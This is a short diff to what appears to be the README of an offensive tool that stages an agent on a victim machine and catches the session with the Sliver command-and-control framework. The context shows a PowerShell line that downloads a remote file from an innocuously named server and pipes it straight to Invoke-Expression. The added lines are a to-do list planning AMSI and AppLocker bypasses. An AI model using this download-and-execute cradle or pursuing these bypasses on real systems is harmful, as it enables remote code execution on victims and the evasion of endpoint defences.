@@ -188,3 +188,9 @@ On the victim, the following command executes the download and staging of the ag
 (New-Object System.Net.WebClient).DownloadString('https://some-server/unsuspicious.txt') | IEX)
 ```
 ![Catch the session with sliver](./doc/img/sliver002.png)
+
+
+# TODO
+
+- [] Amsi bypass
+- [] Applocker bypass
